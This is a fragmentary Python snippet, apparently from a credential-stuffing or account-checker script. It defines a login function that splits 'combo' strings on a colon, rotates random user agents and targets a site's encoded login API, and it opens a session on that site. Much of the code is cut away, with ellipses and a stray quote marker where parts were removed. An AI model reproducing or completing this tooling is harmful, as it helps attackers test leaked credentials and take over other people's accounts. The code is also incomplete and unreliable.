...
def login(combo, cookies):
    url = "https://porrttbbtt.club/api/V1L3VzZXIvYXV0aC9sb2dpbg%3D%3D"
    headers = {
        "Host": "porrttbbtt.club",
        "Accept": "*/*",
        "User-Agent": random.choice(user_agents),
        "access-control-allow-credentials": "true",
        "access-control-allow-origin": "https://porrttbbtt.club"
    }
    combo = combo.split(":")
...
'''
    ...
    session.get("https://porrttbbtt.club")
